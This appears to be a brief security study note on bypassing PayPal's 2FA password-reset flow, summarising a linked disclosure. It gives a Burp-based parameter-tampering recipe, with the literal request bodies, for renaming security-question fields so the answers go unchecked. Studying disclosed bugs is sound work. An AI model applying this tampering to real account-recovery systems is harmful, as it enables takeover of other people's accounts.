# Authentication Bypasses

## 2FA Password Reset

Reading: https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass

You are resetting your password, but doing it from a location or device that your provider does not recognize. 
So you need to answer the security questions you set up. 
The other issue is that those security questions are also stored on another device (not with you) and you don’t remember them.


Q: What is the name of your favourite teacher?
Answer: A1

Q: What is the name of the street you grew up on?
Answer: A2

Input: A1=a, A2=a, Output: Not quite, please try again.

Steps:
1. Intercept the request with burp

2. Change the request from
```secQuestion0=a&secQuestion1=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746```
to
```secQuestion3=a&secQuestion4=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746```

Answer:
```secQuestion3=a&secQuestion4=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746```




